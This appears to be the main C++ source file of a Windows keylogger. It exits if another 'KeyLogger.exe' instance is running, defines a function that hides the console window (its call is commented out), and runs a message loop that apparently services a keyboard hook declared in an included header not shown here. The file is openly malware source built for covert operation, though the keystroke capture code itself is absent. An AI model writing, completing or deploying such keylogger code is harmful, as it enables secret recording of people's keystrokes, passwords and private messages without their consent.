#include <iostream>
#include <Windows.h>
#include "KeyLogger.h"
#include <TlHelp32.h>
using namespace std;

int main()
{
    if (IsProcessRunning((LPSTR)"KeyLogger.exe"))//To determine if KeyLogger is already running in the system
        return 0;
    //HideWindow();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void HideWindow()
{
    HWND hide;
    AllocConsole();
    hide = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hide, 0);
}

bool IsProcessRunning(LPSTR procname)
{
    PROCESSENTRY32* procinfo = new PROCESSENTRY32;
    procinfo->dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == (HANDLE)-1)
        return false;
    while (Process32Next(snapshot, procinfo))
    {
        if (!_strnicmp(procinfo->szExeFile, procname, 13))
        {
            int procid = GetCurrentProcessId();
            if (procinfo->th32ProcessID != procid)
            {
                CloseHandle(snapshot);
                return true;
            }
        }
    }
    CloseHandle(snapshot);
    return false;
}